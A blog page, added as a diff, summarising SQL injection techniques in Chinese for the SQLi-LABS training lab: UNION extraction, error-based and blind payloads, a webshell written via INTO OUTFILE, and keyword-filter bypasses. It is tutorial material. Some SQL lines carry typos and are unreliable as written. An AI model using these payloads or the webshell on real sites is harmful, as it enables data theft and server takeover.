@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Cayce">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SQLi-LABS LESS-1~28a绕过姿势小结感悟：  上一篇对28a及之前的关卡做理论小结的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏洞中能排进前三的漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-LABS LESS-1~28a绕过姿势小结">
+<meta property="og:url" content="http://example.com/2021/05/09/SQLi-LABS-LESS-1-28a%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="Atlantis">
+<meta property="og:description" content="SQLi-LABS LESS-1~28a绕过姿势小结感悟：  上一篇对28a及之前的关卡做理论小结的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏洞中能排进前三的漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-09T05:51:53.000Z">
+<meta property="article:modified_time" content="2021-05-09T06:01:12.873Z">
+<meta property="article:author" content="Cayce">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>SQLi-LABS LESS-1~28a绕过姿势小结 - Atlantis</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SQLi-LABS LESS-1~28a绕过姿势小结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-05-09 13:51" pubdate>
+          May 9, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          77 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQLi-LABS LESS-1~28a绕过姿势小结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SQLi-LABS-LESS-1-28a绕过姿势小结"><a href="#SQLi-LABS-LESS-1-28a绕过姿势小结" class="headerlink" title="SQLi-LABS LESS-1~28a绕过姿势小结"></a>SQLi-LABS LESS-1~28a绕过姿势小结</h1><h3 id="感悟："><a href="#感悟：" class="headerlink" title="感悟："></a>感悟：</h3><p>  上一篇对28a及之前的关卡做<a target="_blank" rel="noopener" href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89">理论小结</a>的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏洞中能排进前三的漏洞，简直就是一大威胁，这个应该是了解注入之前就该了解的，没必要在我这重复一遍。好了，多的废话也不想讲了，还是进入正题的好。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h3><hr>
+<p>  在正式记录SQL注入过程之前，在这里要先介绍几个SQL常用语法和PHP接收及处理变量的常用语法。</p>
+<h6 id="SQL语法："><a href="#SQL语法：" class="headerlink" title="SQL语法："></a>SQL语法：</h6><ol>
+<li><p>增：</p>
+<ul>
+<li>插入元组：<code>insert into &lt;已有的新表&gt; values([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),···</code></li>
+<li>复制表数据：<code>insert into &lt;已有的新表&gt; (列名) select &lt;原表列名&gt; from &lt;原表名&gt;</code></li>
+<li>导入数据至新建表：<code>select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;原表名&gt;</code></li>
+<li>Union 插入多元组：<code>insert &lt;表名&gt; &lt;列名&gt; select &lt;列值&gt; tnion select &lt;列值&gt;</code></li>
+</ul>
+</li>
+<li><p>删：</p>
+<ul>
+<li>删列值：<code>delete from &lt;表名&gt; [where &lt;删除条件&gt;]</code></li>
+<li>删表：<code>drop table &lt;表名&gt;</code></li>
+</ul>
+</li>
+<li><p>改：</p>
+<ul>
+<li><code>update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]</code></li>
+</ul>
+</li>
+<li><p>查：</p>
+<ul>
+<li><p>条件查询：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;[order by &lt;排序的列名&gt;[asc或desc]</code></p>
+</li>
+<li><p>标记查询：<code>select &lt;列名&gt;, &lt;标识&gt; as &lt;标识名&gt; from &lt;表名&gt;</code></p>
+</li>
+<li><p>关键字查询：<code>select top &lt;数值&gt; &lt;列名&gt; from &lt;表名&gt;</code> 查询前指定行</p>
+<p><code>select top &lt;数值&gt; percent &lt;列名&gt; from &lt;表名&gt;</code>查询前指定百分比</p>
+</li>
+</ul>
+</li>
+<li><p>排序：<code>order by[列名]</code>用于对指定列排序，<code>group by[列名]</code>对指定列进行分组排序</p>
+</li>
+<li><p>子查询：<code>select &lt;列名&gt; from &lt;表名1&gt; where &lt;约束条件1&gt;[select &lt;列名&gt; from &lt;表名2&gt; where &lt;约束条件2&gt;]</code></p>
+</li>
+<li><p>联合查询：<code>select * from &lt;表名1&gt; union select * from &lt;表名2&gt;</code></p>
+</li>
+<li><p>连接查询：</p>
+<ul>
+<li><p>内连接：</p>
+<p><code>select &lt;列名&gt; from &lt;表a&gt;,&lt;表b&gt; where &lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;</code></p>
+<p><code>select &lt;列名&gt; from &lt;表a&gt; inner jion &lt;表b&gt; on (&lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;)</code></p>
+</li>
+<li><p>外连接：</p>
+<p><code>select &lt;列名0&gt; from &lt;表名1&gt; as &lt;别名1&gt; left outer jion &lt;表名2&gt; as &lt;别名2&gt; on &lt;别名1&gt;.&lt;列名&gt;=&lt;别名2&gt;.&lt;列名&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>约束条件：<code>and,or,&gt;,&lt;,=,&lt;&gt;,!=,like,between and,jion in,in,not,having</code></p>
+</li>
+<li><p>注释符：<code>#,--,/**/,/xxx/,/!xxx/</code></p>
+</li>
+</ol>
+<h6 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h6><p>  函数全部来自sqli-labs前28a关卡的index.php文件：</p>
+<p>  <code>include($file)</code>函数将 PHP 文件的内容插入另一个 PHP 文件;</p>
+<p>  <code>isset($_GET[&#39;id&#39;])</code>用于判断是否存在该变量；</p>
+<p>  <code>$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);</code>将URL传过来的ID值存入result.txt中；</p>
+<p>  <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>为sql语句，也是注入的关键；</p>
+<p>  <code>$result=mysql_query($sql);</code>执行一条sql语句，执行成功返回true，失败返回false，保留缓存；</p>
+<p>  <code>$row = mysql_fetch_array($result);</code>从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成数组，如果没有更多行则返回 false；</p>
+<p>  <code>mysql_error()</code>返回上一个 MySQL 操作产生的文本错误信息；</p>
+<p>  <code>check_input()</code>文件内自定义函数，主要用来过滤特殊字符，基本限定所有直接绕过方式，具体内容解释如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>    &#123;<br>        <span class="hljs-comment">// truncation (see comments)</span><br>        <span class="hljs-variable">$value</span> = substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>    &#125;<br>    <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>	<span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>    &#123;<br>        <span class="hljs-variable">$value</span> = stripslashes(<span class="hljs-variable">$value</span>);<br>    &#125;<br>	<span class="hljs-comment">// Quote if not a number</span><br>	<span class="hljs-keyword">if</span> (!ctype_digit(<span class="hljs-variable">$value</span>))<br>    &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$value</span> = intval(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>  <code>empty($value)</code> 函数用于检查一个变量是否为空；</p>
+<p>  <code>substr($str,$begin,$length)</code>函数取字符串子串，第一个参数为主字符串，第二个参数为主字符串中截取子串开始的位置，第三个参数为截取子串的长度；</p>
+<p>  <code>get_magic_quotes_gpc()</code>函数取得 PHP 环境变数 magic_quotes_gpc 的值，返回 0 表示关闭本功能，返回 1 表示本功能打开。当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转义为含有反斜线的溢出字符。</p>
+<p>  <code>stripslashes($str)</code>函数删除反斜杠；</p>
+<p>  <code>ctype_digit($str)</code>函数检测字符串中的字符是否都是数字，负数和小数会检测不通过。 注意，参数一定要是字符串，如果不是字符串，则会返回0/FASLE。</p>
+<p>  <code>mysql_real_escape_string($value,$connection)</code>函数转义 SQL 语句中使用的字符串中的特殊字符。受影响的字符有<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>;</p>
+<p>  <code>intval(mixed $var,int $base = xx)</code>函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 整数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
+<p>  <code>$timestamp = time() + 3600; date($format, $timestamp)</code>time()函数返回当前时间的 Unix 时间戳，并格式化为日期。date()函数对时间进行格式化，format为格式，timestamp为规定时间戳。</p>
+<p>  <code>base64_decode($cookee);</code>函数对参数进行base64解密。</p>
+<p>  <code>setcookie(name,value,expire,path,domain,secure)</code>函数向客户端发送一个 HTTP cookie。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。</p>
+<p>  <code>header(string,replace,http_response_code)</code>函数向客户端发送原始的 HTTP 报头。</p>
+<p>  <code>session_start();</code>函数会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。 </p>
+<p>  <code>mysql_escape_string ( string unescaped_string )</code>函数将 unescaped_string 转义，但并不转义 % 和 _。</p>
+<p>  <code>alert()</code> 函数用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
+<p>  <code>mysql_affected_rows()</code>函数返回前一次 MySQL 操作所影响的记录行数。</p>
+<p>  <code>blacklist($id)</code>为自定义函数，主要用到<code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>函数，该函数执行一个正则表达式的搜索和替换，如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。多字符过滤。</p>
+<h6 id="MYSQL五类报错注入函数："><a href="#MYSQL五类报错注入函数：" class="headerlink" title="MYSQL五类报错注入函数："></a>MYSQL五类报错注入函数：</h6><ol>
+<li><pre><code class="php+HTML">1. floor()：取整函数，打开MySQL命令框输入命令查看报错信息。
+select count(*) from infomation_schema.tables group by concat((select database()),floor(rand(0)*2);
+2. extractvalue()：接收两个参数，第一个XML文档，第二个xpath语句。xpath语句格式错误返回数据。
+select extractvalue(1,concat(0x7e,(select database()),0x7e));
+3. updatexml()：查询出所有库以及库中所有表的信息。
+select updatexml(1,concat(0x7e,(select database()),0x7e,1);
+4. exp()：返回e(自然对数的底)指数X的幂值。
+select EXP(~(SELECT * from(select database())a));
+5. 六个同类空间索引函数：
+   - GeometryCollection()：零个或更多个 geometry 或 geography 实例的集合。
+   select GeometryCollection((select * from (select * from(select user())a)b));
+   - polygon()：存储为一系列点的二维表面，这些点定义一个外部边界环和零个或多个内部环。
+   select polygon((select * from(select * from(select user())a)b));
+   - multipoint()：零个点或更多个点的集合。
+   select multipoint((select * from(select * from(select user())a)b));
+   - multilinestring()：零个或更多 geometry 或 geography LineString 实例的集合。
+   select multilinestring((select * from(select * from(select user())a)b));
+   - linestring()：一个一维对象，表示一系列点和连接这些点的线段。
+   select LINESTRING((select * from(select * from(select user())a)b));
+   - multipolygon()：零个或更多个 Polygon 实例的集合。
+   select multipolygon((select * from(select * from(select user())a)b));
+</code></pre>
+</li>
+</ol>
+<hr>
+<p>  语法不是一成不变的，有时候灵活贯通才是最重要的，接下来记录常见SQL注入姿势：</p>
+<ol>
+<li><h6 id="普通注入："><a href="#普通注入：" class="headerlink" title="普通注入："></a>普通注入：</h6><p>这一类注入是最基础且最核心的注入，过程也已经公式化了：</p>
+<p>1）判断注入点：<code>&#39;,&quot;,无，),&#39;),&quot;)</code>等，接<code>or 1=1</code>和<code>or 1=2</code>，根据返回判断，恒等式成立表示成功，矛盾等式成立表示错误，最后面用注释符。</p>
+<p>2）判断字段个数：<code>order by i #</code>，i 为自然数，列存在则返回正常界面，不存在返回错误界面。例，当列的个数为4时，i从1到4都会返回正常界面，i 为5及5之后的时候，会返回错误信息，由此可判断，数据库中当前正在使用的表有4 个字段（列）。这里假设有4个字段。</p>
+<p>3）判断显位：<code>union select 1,2,3,4 #</code>显位会将界面中值所在的字段显示出来。例，表中原本是显示“test”的地方现在显示2，说明“test”所在的字段会在界面中显示，而且是显示在2的位置。判断显位的主要目的是为了在构造查询语句的时候明白要把查询的值放在哪个字段。这里假设显位为2，3。</p>
+<p>4）爆库名：<code>union select 1,schema_name,3,4 from information_schema.schemata limit 0,1 #</code>或<code>union select 1,group_concat(schema_name),3,4 from information_schema.schemata#</code>或<code>union select 1,database(),3,4 #</code>第一种是手工逐个爆出数据库名，通过修改limit后面的第一个参数，回显不同的数据库；第二种是利用group_concat()将数据库成组爆出，用逗号隔开；第三种是利用database()方法直接爆出当前正在使用的数据库名（只有一个）。这里假设库名为“security”。</p>
+<p>5）爆表名：<code>union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;security&#39; limit 0,1#</code>或<code>union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() #</code>或<code>union select 1,user(),3,4 #</code>第一种是手工逐个爆出表名，通过修改limit后面的第一个参数，回显不同的表；第二种是利用group_concat()将表成组爆出，用逗号隔开；第三种是利用user()方法直接爆出当前正在使用的表名（只有一个）。这里假设表名为“users”。</p>
+<p>6）爆字段名：<code>union select 1,column_name,3,4 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1 #</code>或<code>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=user() #</code>第一种是手工逐个爆出字段名，通过修改limit后面的第一个参数，回显不同的字段；第二种是利用group_concat()将字段成组爆出，用逗号隔开。这里假设字段名为id，username，password，is_admin。</p>
+<p>7）爆元组值：<code>union select 1,username,password,4 from security.users limit 0,1 #</code>或<code>union select 1,group_concat(username),group_concat(password),4 from users#</code>第一种是手工逐个爆出元组值，通过修改limit后面的第一个参数，回显不同的元组值；第二种是利用group_concat()将元组值成组爆出，用逗号隔开。元组值就是最后的目标。</p>
+<p>==下面的(select)表示普通注入4)到7)。。。。。==</p>
+</li>
+<li><h6 id="双注入："><a href="#双注入：" class="headerlink" title="双注入："></a>双注入：</h6><p>双注入是在普通注入的基础上再加一成注入条件，主要是利用mysql虚拟表报错。注入点，字段数，和显位的判断与普通注入相似。这里假设有3个字段，显位为2，3。</p>
+<p>爆内容格式：<code>union select 1,count(*),concat((select),floor(rand()*2)) as a from information_schema.tables group by a #</code>或<code>union select 1,count(*),count(*) from information_schema.tables group by concat((select),floor(rand()*2)) #</code>，这里的select语句不能用到group_concat()，会和前面的concat()冲突。</p>
+</li>
+<li><h6 id="SQL盲注："><a href="#SQL盲注：" class="headerlink" title="SQL盲注："></a>SQL盲注：</h6><p>1）布尔盲注：</p>
+<ul>
+<li><p>判断长度：<code>and length(select)&gt;n #</code>，n为自然数，也就是长度，回显出现明显不一样的时候。</p>
+<p>length($str)方法返回字符串长度。</p>
+</li>
+<li><p>判断内容：<code>and ascii(substr((select),i,1))&gt;n #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，也可以写成<code>and substr((select),1,j)=&#39;$str&#39;#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p>
+<p>sacii($str)方法将字符串转换为ascii码。</p>
+<p>substr($str,i,j)方法从str中的第i位开始提取j个字符。</p>
+</li>
+</ul>
+<p>2）时间盲注：</p>
+<ul>
+<li><p>判断内容：<code>and if(ascii(substr((select),i,1))&gt;n,1,sleep(3)) #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，同理这里也可以写成<code>and if(substr((select),1,j)=&#39;$str&#39;,1,sleep(3))#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p>
+<p>if(example, true,false)条件判断，当true!=0&amp;&amp;true!=NULL时返回true，否则返回false。</p>
+<p>sleep(3)延迟输出，这里延迟时间3秒。</p>
+</li>
+</ul>
+<p>3）报错盲注：</p>
+<ul>
+<li><p>直接语句注入，即双注入。</p>
+</li>
+<li><p>xpath函数注入：<code>and extractvalue(1,concat(0x7e,(select),0x73)) #</code>或<code>and updatexml(1,concat(0x7e,(select),0x7e),1) #</code>或<code>and EXP(~(SELECT * from(select )a)) #</code>或mysql六大空间图形索引函数。</p>
+<p>extractvalue($xml-document,xml-path) :对XML文档进行查询的函数，第二个参数xml-path是xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容。</p>
+<p>updatexml($xml-documet,xml-path,update-content)方法更新xml文档，利用原理同上。</p>
+</li>
+<li><p>重复性报错：<code>union select 1,2,3 from (select name_const((select),1),name_const((select),1))x #</code>(select)语句必须一样，x为别名。</p>
+<p>name_const(name,value) 返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p>
+</li>
+</ul>
+</li>
+<li><p>文件导入导出：</p>
+<ul>
+<li><p><code>load_file()</code>:<code>union select 1,2,load_file(&#39;c:\\xxx\..\xxx.xxx&#39;)</code></p>
+<p>load_file()：读取文件并返回文件内容为字符串，使用有<a target="_blank" rel="noopener" href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/#more">前提</a>，参考文件导入导出。</p>
+</li>
+<li><p>目标文件不存在采用<code>SELECT...INTO OUTFILE</code>：<code>select &lt;?php @eval($_POST[&#39;sb&#39;])?&gt; into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>，该例子在c盘选定目录下新建xxx.php文件，并将一句话木马内容<code>&lt;?php @eval($_POST[&#39;sb&#39;])?&gt;</code>写入文件。</p>
+</li>
+<li><p>当然，这两个方法可以同时使用：<code>union select 1,2,(select load_file(&#39;C:\\xxx\..\xxx.php&#39;)) into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>。</p>
+</li>
+</ul>
+</li>
+<li><p>字符串过滤：</p>
+<ul>
+<li><p>注释符被过滤可以采用其他等价形式的注释符绕过，常用注释符：<code>//，，– ，=，/**/，#，–+，– -，;，%00，–a，&amp;&amp;，||，空格</code></p>
+<p>例：空格被过滤：<code>union/**/select/**/1,2,3/**/from/**/usrs/**/where/**/1/**/#</code></p>
+</li>
+<li><p>常用字符串被过滤可以用大小写或双拼写绕过，常用字符串：<code>union，select，and，or，password，oder，where，like</code></p>
+<p>例：union的大小写都被过滤：<code>uniUNIONon</code>代替</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>  目前能回想起来的大概就这么多，还有一些更深层次和零零碎碎的留至以后想起来的时候补充。如果有什么错误或不完善的地方，欢迎表哥表姐们指教。交友通道：1394850274</p>
+<p>参考文献：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Dleo/p/5493782.html">https://www.cnblogs.com/Dleo/p/5493782.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.runoob.com/php/php-tutorial.html">http://www.runoob.com/php/php-tutorial.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/daxueshan/p/6687521.html">https://www.cnblogs.com/daxueshan/p/6687521.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SQLi-LABS LESS-1~28a绕过姿势小结</div>
+      <div>http://example.com/2021/05/09/SQLi-LABS-LESS-1-28a绕过姿势小结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Cayce</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 9, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/09/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E7%BB%93/" title="PHP正则表达式小结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP正则表达式小结</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
